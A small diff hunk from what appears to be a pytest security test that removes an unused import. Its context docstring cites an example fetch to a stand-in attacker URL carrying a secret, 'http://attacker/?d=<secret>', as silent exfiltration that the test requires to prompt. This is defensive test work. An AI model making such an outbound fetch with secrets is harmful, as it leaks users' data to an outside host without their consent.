@@ -5,7 +5,6 @@ DEEP_INGEST http://attacker/?d=<secret> (no prompt) = silent exfiltration.
 This closes both halves: a protected read prompts, and an outbound fetch prompts.
 """
 import logging
-import os
 
 import pytest
 
